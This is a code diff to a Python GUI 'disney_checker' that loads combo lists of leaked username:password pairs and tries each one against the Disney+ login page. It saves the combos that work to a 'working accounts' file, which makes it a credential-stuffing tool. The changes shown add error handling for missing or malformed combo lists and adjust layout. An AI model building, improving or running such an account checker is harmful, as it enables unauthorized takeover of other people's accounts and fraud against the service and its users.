@@ -18,7 +18,7 @@ class disney_checker():
 	def __init__(self, root):
 	
 		self.infobox = Text(root, bg='goldenrod3',font=('Arial',11),height = 360, width=460)
-		self.file_directory = str(Path(__file__).parent)+'/disney'
+		self.file_directory = str(Path(__file__).parents[1])+'/disney'
 		self.page = 'https://www.disneyplus.com/login'
 		self.users = []
 		self.passwords = []
@@ -31,22 +31,34 @@ class disney_checker():
 	def split_combo_file(self,root):
 	
 		self.split_combos = split_combos(root)
-	
+		
+		
 	def draw_checker_button(self,root):
 			
-		self.start_checker.place(x=328,y=560)
+		self.start_checker.place(x=298,y=560)
 			
 	def draw_the_infobox(self):
 	
 		self.infobox.place(x=58,y=288,width=681,height=250)
 		
 	def split_username_and_password(self):
-	
-		os.makedirs('accounts',exist_ok=True)
-		with open(self.file_directory, 'r') as disney:
-			for line in disney.readlines():
-					self.users.append(line.split(':')[0].strip())
-					self.passwords.append(line.split(':')[1].strip())
+		self.error_flag=False
+		try:		
+			os.makedirs('accounts',exist_ok=True)
+			with open(self.file_directory, 'r') as disney:
+				for line in disney.readlines():
+						self.users.append(line.split(':')[0].strip())
+						self.passwords.append(line.split(':')[1].strip())
+						
+		except FileNotFoundError:
+		
+			self.error_flag=True
+			self.infobox.insert(END,"There is no combo-list present in directory.\n\nMake sure to include a combo-list for the appropriate service in:\n\n ' {} '".format(str(Path(__file__).parents[1])))
+			
+		except IndexError:
+		
+			self.error_flag=True
+			self.infobox.insert(END,"There is something wrong with the combolist.\n\nIt might have been split twice, have spaces included, or invalid characters")
 						
 	def destroy_all_elements(self):
 	
@@ -55,18 +67,18 @@ class disney_checker():
 		self.infobox.destroy()
 		self.split_combos.destroy_info_label()
 		
-	def check_the_accounts(self,root):
-	
+	def check_the_accounts(self,root):	
 		self.draw_the_infobox()
 		self.split_username_and_password()
 		self.start_checker.destroy()
 		self.split_combos.destroy_split_button()
 		self.split_combos.destroy_info_label()
 		checking_progress_label = Label(root,background='goldenrod3', text = 'Opening Browser...',font=('Arial',12))
-		checking_progress_label.place(x=68,y=238)
+		if self.error_flag == False:
+			checking_progress_label.place(x=68,y=238)
 		index = 0
 		error_on_first_page = False
-		while index != len(self.users):
+		while index != len(self.users) and self.error_flag == False:
 			with open('accounts/disney_working_accounts','a') as account_results:
 				try:
 					self.infobox.insert(END,'Trying Combo {} out of {}'.format(index+1, len(self.users)))
